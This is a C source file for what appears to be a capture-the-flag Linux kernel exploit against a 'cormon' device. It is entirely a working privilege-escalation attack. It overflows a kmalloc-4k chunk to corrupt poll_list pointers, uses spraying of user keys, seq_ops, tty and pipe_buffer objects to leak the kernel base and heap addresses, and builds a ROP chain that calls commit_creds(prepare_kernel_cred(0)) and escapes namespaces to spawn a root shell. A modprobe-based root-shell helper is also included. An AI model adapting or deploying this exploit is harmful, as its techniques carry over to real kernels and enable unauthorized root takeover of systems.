#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <sys/msg.h>
#include <limits.h>
#include <keyutils.h>
#include <sys/xattr.h>

#define DEV_PATH "/proc_rw/cormon"   // the path the device is placed

#define ulong unsigned long
#define PAGE_SZ 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
#define ARRAY_SIZE(a) (sizeof((a)) / sizeof((a)[0]))
#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }
#define MAX_KEYS 199

typedef struct {
    int read;
    int write;
} pipe_t;

int seq_ops[0x10000];
int ptmx[0x1000];
int keys[0x1000];
pthread_t poll_tid[0x1000];
int pipes[0x1000][0x02];
int fds[0x1000];
int n_keys;

struct poll_list {
	struct poll_list *next;
	int len;
	struct pollfd entries[];
};

struct rcu_head {
    void *next;
    void *func;
};

struct user_key_payload {
    struct rcu_head rcu;
    unsigned short datalen;
    char *data[];
};

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /tmp/x; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
    system("chmod +x /tmp/y");
    system("/tmp/y");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int randint(int min, int max)
{
    return min + (rand() % (max - min));
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
        char *args[] = { "/bin/bash", "-i", NULL };
        execve(args[0], args, NULL);
	}
	exit(0);
}

static int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

static bool is_kernel_ptr(uint64_t val)
{
    return (val & KERNEL_MASK) == KERNEL_MASK
        && val != 0xffffffffffffffff;
}

static bool is_heap_ptr(uint64_t val)
{
    return (val & HEAP_MASK) == HEAP_MASK
        && val != 0xffffffffffffffff;
}

void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        errExit("[X] sched_setaffinity()");
    }
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        errExit("[X] assign_thread_to_core_range()");
    }
}

void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        errExit("[X] init_fd()");
    }
}

static void alloc_seq_ops(int i) {
    seq_ops[i] = open("/proc/self/stat", O_RDONLY);

    if (seq_ops[i] < 0) {
        errExit("[X] spray_seq_ops()");
    }
}

static void free_seq_ops(int i) {
    if (close(seq_ops[i]) < 0) {
        errExit("[X] free seq_ops");
    }
}

static void alloc_tty(int i) {
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0) {
        errExit("[X] alloc_tty");
    }
}

static void free_tty(int i) {
    if (close(ptmx[i]) < 0) {
        errExit("[X] free tty");
    }
}

static int alloc_key(int id, char *buf, size_t size)
{
    char desc[256] = { 0 };
    char *payload;
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buf ? buf : calloc(1, size);

    if (!buf)
        memset(payload, id, size);

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0)
	{
        errExit("add_key");
	}

    return key;
}

static void free_key(int i)
{
	keyctl_revoke(keys[i]);
	keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING);
    n_keys--;
}

static char *get_key(int i, size_t size)
{
	char *data;
    int ret;

	data = calloc(1, size);
    if (data == NULL) {
        errExit("calloc");
    }

	ret = keyctl_read(keys[i], data, size);
    if (ret < 0) {
        free(data);
        errExit("keyctl_read");
    }

	return data;
}

void alloc_pipe_buf(int i)
{
    if (pipe(pipes[i]) < 0) {
        perror("[X] alloc_pipe_buff()");
        return;
    }

    if (write(pipes[i][1], "XXXXX", 5) < 0) {
        perror("[X] alloc_pipe_buff()");
        return;
    }
}

void release_pipe_buf(int i)
{
    if (close(pipes[i][0]) < 0) {
        errExit("[X] release_pipe_buf");
    }

    if (close(pipes[i][1]) < 0) {
        errExit("[X] release_pipe_buf");
    }
}

/*
 * sys_execve,sys_execveat,sys_fork,sys_keyctl,sys_msgget,sys_msgrcv,sys_msgsnd
 * ,sys_poll,sys_ptrace,sys_setxattr,sys_unshare
 *
 *
 * dedicated cache - alloc 0x1000
 *
 * [CoRMon::Debug] Syscalls @ 0xffff952c8bf3a000
 *
 * poll_list size:
 * - 12 + 8 * amt_elements
 */

/*
struct pollfd {
	int fd;
	short events;
	short revents;
};
*/

typedef struct {
    int fd_read;
    unsigned amt;
    unsigned timeout;
    bool suspend;
} thread_args_t;

static unsigned corrupted_key;
#define POLL_LIST_SZ 0x10
#define POLL_FD_SZ 0x8
#define MAX_POLL_LIST_FDS 510
#define POLLFD_PER_PAGE  ((PAGE_SZ-sizeof(struct poll_list)) / sizeof(struct pollfd))
#define STACK_PPS_SZ 0x100

void free_all_keys(bool skip_corrupted_key)
{
    for (int i = 0; i < n_keys; i++)
    {
        if (skip_corrupted_key && i == corrupted_key)
            continue;

        free_key(i);
    }

    sleep(1); // GC keys
}

/*
 * Calc amount of fds we need to alloc to trigger allocation of a specific
 * kmalloc chunk
 */
static unsigned fds_to_alloc(size_t sz)
{
    // stuff allocated on stack (inside stack_pps buf)
    unsigned to_alloc = (STACK_PPS_SZ - sizeof(struct poll_list)) / sizeof(struct pollfd);

    // subtract size needed for poll_list struct
    if (sz % PAGE_SZ == 0) {
        sz -= sz / PAGE_SZ * sizeof(struct poll_list);
    }
    else {
        sz -= (sz / PAGE_SZ + 1) * sizeof(struct poll_list);
    }

    to_alloc += sz / sizeof(struct pollfd);

    return to_alloc;
}

static int poll_threads;
static pthread_mutex_t poll_mutex = PTHREAD_MUTEX_INITIALIZER;

/*
 * Note: In the exploit I use the assign_to_core() function to assign the
 * process to another core before creating poll threads. This is useful to
 * reduce noise due to thread creation on core 0 slabs. Once a thread has
 * been created, it is assigned back to core-0 right before the poll()
 * call using assign_thread_to_core(), a pthread_attr_setaffinity_np() wrapper.
 */
static void* spray_poll_list(void* args)
{
    thread_args_t *ta = (thread_args_t *)args;
    int ret;

    struct pollfd *pollers = calloc(ta->amt, sizeof(struct pollfd));

    for (int i = 0; i < ta->amt; i++) {
        pollers[i].fd = ta->fd_read;
        pollers[i].events = POLLERR;
    }

    assign_thread_to_core(0x0);

    pthread_mutex_lock(&poll_mutex);
    poll_threads++;
    pthread_mutex_unlock(&poll_mutex);

    ret = poll(pollers, ta->amt, ta->timeout);
    if (ret < 0) {
        errExit("poll");
    }

    assign_thread_to_core(randint(0x1, 0x3));

    if (ta->suspend) {
        pthread_mutex_lock(&poll_mutex);
        poll_threads--;
        pthread_mutex_unlock(&poll_mutex);

        while (1) { };
    }

    return NULL;
}

static void create_poll_thread(int i, thread_args_t *args)
{
    int ret;

    ret = pthread_create(&poll_tid[i], 0, spray_poll_list, (void *)args);
    if (ret != 0) {
        errExit("pthread_create");
    }
}

static void join_poll_threads(void)
{
    int ret;
    for (int i = 0; i < poll_threads; i++) {
        ret = pthread_join(poll_tid[i], NULL);

        if (ret < 0) {
            errExit("pthread_join");
        }
        open("/proc/self/stat", O_RDONLY);
    }
    poll_threads = 0x0;
}

static uint64_t try_leak_kernel_ptr(void)
{
    for (int i = 0; i < n_keys; i++) {
        char *data = get_key(i, 0x10000);
        uint64_t *p_data = (uint64_t *)data;

        if (is_kernel_ptr(p_data[0x0])) {
            //print_hex8(data, 0x1000);
            free(data);
            corrupted_key = i;
            return p_data[0x0];
        }

        free(data);
    }

    return 0x0;
}

// leak tty_struct ptr using tty_file_private
static uint64_t try_leak_heap_ptr(void)
{
    char *data = get_key(corrupted_key, 0x20000);
    uint64_t *p_data = (uint64_t *)data;
    for (int i = 0; i < 0x20000 / sizeof(uint64_t); i++) {
        //  a = tty struct ptr
        uint64_t a = p_data[i];
        uint64_t b = p_data[i+1];
        uint64_t c = p_data[i+2];
        uint64_t d = p_data[i+3];

        // tty ptr will always be page aligned since struct is in kmalloc-4096
        // therefore a & 0xfff
        if (is_heap_ptr(a) && (a & 0xfff) == 0x0 && is_heap_ptr(b) &&
                c == d && c != 0x0) {
            free(data);
            return a;
        }
    }

    free(data);

    return 0x0;
}

static void build_rop(char* buf, uint64_t k_base, uint64_t target_obj)
{
    // Stack pivot
    k_base -= 0xffffffff81000000;

    printf("[+] Building rop \n");

    // overwrite ops pointer to point to gadget below - 0x8 because release
    // ptr is at offset 8 in pipe_buf_operations
    *(uint64_t *)&buf[0x10] = target_obj + 0x30;
    // push target object ptr and jump to gadget below
    // push rsi ; in eax, dx ; jmp qword ptr [rsi + 0x66]
    // rsi = struct pipe_buffer
    *(uint64_t *)&buf[0x38] = k_base + 0xffffffff81882840;
    // point rsp to gadget below
    // pop rsp ; ret
    *(uint64_t *)&buf[0x66] = k_base + 0xffffffff810007a9;
    // jump to our rop
    // add rsp, 0x78 ; ret
    *(uint64_t *)&buf[0x00] = k_base + 0xffffffff813c6b78;

    uint64_t* rop = (uint64_t *)&buf[0x80];

    // creds = prepare_kernel_cred(0)
    *rop ++= k_base + 0xffffffff81001618; // pop rdi ; ret
    *rop ++= 0;                           // 0
    *rop ++= k_base + 0xffffffff810ebc90; // prepare_kernel_cred

    // commit_creds(creds)
    *rop ++= k_base + 0xffffffff8101f5fc; // pop rcx ; ret
    *rop ++= 0;                           // 0
    *rop ++= k_base + 0xffffffff81a05e4b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
    *rop ++= k_base + 0xffffffff810eba40; // commit_creds

    // task = find_task_by_vpid(1)
    *rop ++= k_base + 0xffffffff81001618; // pop rdi ; ret
    *rop ++= 1;                           // pid
    *rop ++= k_base + 0xffffffff810e4fc0; // find_task_by_vpid

    // switch_task_namespaces(task, init_nsproxy)
    *rop ++= k_base + 0xffffffff8101f5fc; // pop rcx ; ret
    *rop ++= 0;                           // 0
    *rop ++= k_base + 0xffffffff81a05e4b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
    *rop ++= k_base + 0xffffffff8100051c; // pop rsi ; ret
    *rop ++= k_base + 0xffffffff8245a720; // init_nsproxy;
    *rop ++= k_base + 0xffffffff810ea4e0; // switch_task_namespaces

    // new_fs = copy_fs_struct(init_fs)
    *rop ++= k_base + 0xffffffff81001618; // pop rdi ; ret
    *rop ++= k_base + 0xffffffff82589740; // init_fs;
    *rop ++= k_base + 0xffffffff812e7350; // copy_fs_struct;
    *rop ++= k_base + 0xffffffff810e6cb7; // push rax ; pop rbx ; ret

    // current = find_task_by_vpid(getpid())
    *rop ++= k_base + 0xffffffff81001618; // pop rdi ; ret
    *rop ++= getpid();                    // pid
    *rop ++= k_base + 0xffffffff810e4fc0; // find_task_by_vpid

    // current->fs = new_fs
    *rop ++= k_base + 0xffffffff8101f5fc; // pop rcx ; ret
    *rop ++= 0x6e0;                       // current->fs
    *rop ++= k_base + 0xffffffff8102396f; // add rax, rcx ; ret
    *rop ++= k_base + 0xffffffff817e1d6d; // mov qword ptr [rax], rbx ; pop rbx ; ret
    *rop ++= 0;                           // rbx

    // kpti trampoline
    *rop ++= k_base + 0xffffffff81c00ef0 + 22; // swapgs_restore_regs_and_return_to_usermode + 22
    *rop ++= 0;
    *rop ++= 0;
    *rop ++= (uint64_t)&get_shell;
    *rop ++= user_cs;
    *rop ++= user_rflags;
    *rop ++= user_sp;
    *rop ++= user_ss;
}

/*
 * Bug:
 *  - Off-By-Null overflow in kmalloc-4k
 *
 * Exploit summary:
 *  - Use overflow to corrupt `next` pointer of poll_list object
 *  - Free a user_key_payload based on corrupted `next` pointer
 *  - Spray seq_ops objects to overwrite freed user_key_payload obj
 *    - (*next) func ptr will corrupt user_key_payload->datalen
 *    - allows us to read a oob on heap based on data & datalen ptr of
 *      user_key_payload struct
 *  - Use heap read to leak kernel base
 *  - Free sprayed user_key_payloads except corrupted one
 *    - frees up kmalloc-4096 and kmalloc-32 caches
 *  - Spray tty_struct (4096) && tty_file_private (32)
 *  - Use oob read again to leak address of a tty_struct by reading tty pointer
 *    of tty_file_private struct
 *  - Free seq_ops objects and spray poll_list objects in order to overwrite
 *    UAFed user_key_payload now with a poll_list struct
 *  - Now free the UAFed user_key_payload to free the just allocated
 *    poll_list struct (which will create an UAF on a poll_list struct)
 *  - Spray user_key_payload structs and use setxattr trick to corrupt next
 *    pointer of the just UAFed poll_list struct
 *    -kmalloc-32
 *    - corrupt next pointer to point to target_obj (tty_struct)
 *  - Change target_obj by replacing tty_struct with pipe_buffer
 *  - Free all poll_lists by waiting for poll threads
 *    - will free target_obj = pipe_buffer due to our next ptr corruption
 *    - Creating UAFed pipe_buffer
 *  - free user_key_payloads to corrupt poll_list
 *  - Reallocate user_key_payload in kmalloc-1024 to corrupt UAFed pipe_buffer
 *    obj
 *  - Write rop chain to user_key_payload data
 */
int main(void)
{
    int ret;
    int fd;
    char buf[PAGE_SZ] = {0};
    char key[32] = {0};

    // assign to core 0 since SLABS are per-CPU
    assign_to_core(0x0);
    save_state();

    fd = open(DEV_PATH, O_RDWR);

    if (fd < 0) {
        errExit("open");
    }

    init_fd(0);

    puts("[+] Filling kmalloc-32 with seq-ops");
    for (int i = 0; i < 2048; i++) {
        alloc_seq_ops(i);
    }

    // make sure first QWORD of victim object (treated as next ptr) is NULL
    // otherwise will crash when freeing linked list of poll list
    puts("[+] Spraying user keys in kmalloc-32");
    for (int i = 0; i < 72; i++) {
        // want this to error -> freed immediately again in order to set first
        // QWORD of user_key_payload to 0
        setxattr("/home/user/.bashrc", "user.x", buf, 32, XATTR_CREATE);
        // use user_key_payload to achieve arbitrary read
        keys[i] = alloc_key(n_keys++, key, 0x20);
    }

    // make sure thread creation does not infer with spray
    assign_to_core(randint(0x1, 0x3));

    // trigger allocation kmalloc-4096 and kmalloc-32 chunk
    unsigned amt = fds_to_alloc(PAGE_SZ + 0x18);
    thread_args_t args = {
        .fd_read = fds[0],
        .amt = amt,
        .timeout = 3000,
        .suspend = false
    };

    puts("[+] Creating poll_threads");
    for (int i = 0x0; i < 14; i++) {
        create_poll_thread(i, &args);
    }

    // change back to our exploit core
    assign_to_core(0x0);

    while (poll_threads != 14) { };
    usleep(250000);

    puts("[+] Spraying more user keys in kmalloc-32");
    for (int i = 72; i < MAX_KEYS; i++) {
        // want this to error -> freed immediately again in order to set first
        // QWORD of user_key_payload to 0
        setxattr("/home/user/.bashrc", "user.x", buf, 0x20, XATTR_CREATE);
        keys[i] = alloc_key(n_keys++, key, 0x20);
    }

    puts("[+] Corrupting poll_list next ptr");
    // trigger NULL byte overflow to corrupt next ptr of a poll_list struct
    // in order to free user_key_playoad object in same slab
    ret = write(fd, buf, PAGE_SZ);

    puts("[+] Triggering arb free");
    // hopefully trigger (abitrary) free
    join_poll_threads();

    // 2 byte of user_key_payload->data_len will be corrupted by single_next
    // ptr of sprayed seq_ops
    puts("[+] Spraying more seq_ops to try an corrupt data_len of user_key_payload");
    for (int i = 2048; i < 2048 + 128; i++) {
        alloc_seq_ops(i);
    }

    uint64_t k_base = try_leak_kernel_ptr();
    if (!k_base) {
        puts("[-] Failed to leak kernel ptr");
        return 0x1;
    }

    k_base -= 0x3275c0;

    printf("[+] Kernel base: %p \n", k_base);

    // free user_key_payload structs except corrupted
    // this will free up chunks in kmalloc-1024 and kmalloc-32 slabs
    free_all_keys(true);

    // fill freed slabs with tty_struct (1024) and tty_file_private (32)
    puts("[+] Spraying tty_file_private / tty_struct structures");
    for (int i = 0x0; i < 72; i++) {
        alloc_tty(i);
    }

    uint64_t target_obj = try_leak_heap_ptr();
    if (!target_obj) {
        puts("[-] Failed to leak heap ptr");
        return 0x1;
    }

    printf("[+] Tty struct leak: %p \n", target_obj);

    // free seq_ops we overwrote UAFed user_key_payload with
    puts("[+] Freeing seq_ops structures");
    for (int i = 2048; i < 2048 + 128; i++) {
        free_seq_ops(i);
    }

    // alloc poll_list in kmalloc-32
    amt = fds_to_alloc(0x18);
    args.fd_read = fds[0];
    args.amt = amt;
    args.timeout = 3000;
    args.suspend = true;

    // make sure thread creation does not infer with spray
    assign_to_core(randint(0x1, 0x3));

    // allocate poll_list in chunk of UAFed user_key_payload
    puts("[+] Creating poll threads");
    for (int i = 0x0; i < 192; i++) {
        create_poll_thread(i, &args);
    }

    assign_to_core(0x0);

    while (poll_threads != 192) { };
    usleep(250000);

    puts("[+] Freeing corrupted key");
    // free UAFed key which will free poll_list struct we just allocated
    free_key(corrupted_key);
    // GC key
    sleep(1);


    puts("[+] Overwriting poll_list next pointer");
    /*
     * -0x18 because we will corrupt a pipe_buffer struct using
     *  by writing to user_key_payload->data which is at offset 0x18
     */
    *(uint64_t *)&buf[0] = target_obj - 0x18;
    for (int i = 0; i < MAX_KEYS; i++) {
        // use setxattr trick to initialize rcu member of user_key_payload
        // with target_obj ptr
        setxattr("/home/user/.bashrc", "user.x", buf, 32, XATTR_CREATE);
        // now alloc user_key_payload in place of UAFed poll_list object in
        // order to overwrite next ptr
        keys[i] = alloc_key(n_keys++, key, 32);
    }

    puts("[+] Freeing tty structs");
    // free tty_structs to replace them with pipe_buffer because easier to corrupt
    for (int i = 0; i < 72; i++) {
        free_tty(i);
    }

    // GC
    sleep(1);

    // allocate pipe_buffer structs to replace tty structs in kmalloc-1024
    puts("[+] Spraying pipe_buffer structs");
    for (int i = 0; i < 1024; i++) {
        alloc_pipe_buf(i);
    }

    // now wait for pipe_buffer struct to be freed due to our next pointer
    // corruption
    while (poll_threads != 0x0) { };

    memset(buf, 0x0, sizeof(buf));
    build_rop(buf, k_base, target_obj);

    // free user_key_payload structs
    puts("[+] Freeing user keys");
    free_all_keys(false);

    // reallocate key in kmalloc-1024 to corrupt pipe_buffer struct +
    // spray our ROP
    puts("[+] Spraying ROP chain");
    for (int i = 0; i < 31; i++) {
        keys[i] = alloc_key(n_keys++, buf, 600);
    }

    puts("[+] Hijacking control flow...");
    for (int i = 0; i < 1024; i++) {
        release_pipe_buf(i);
    }

    puts("[+] Done");

    WAIT();

    return 0;
}
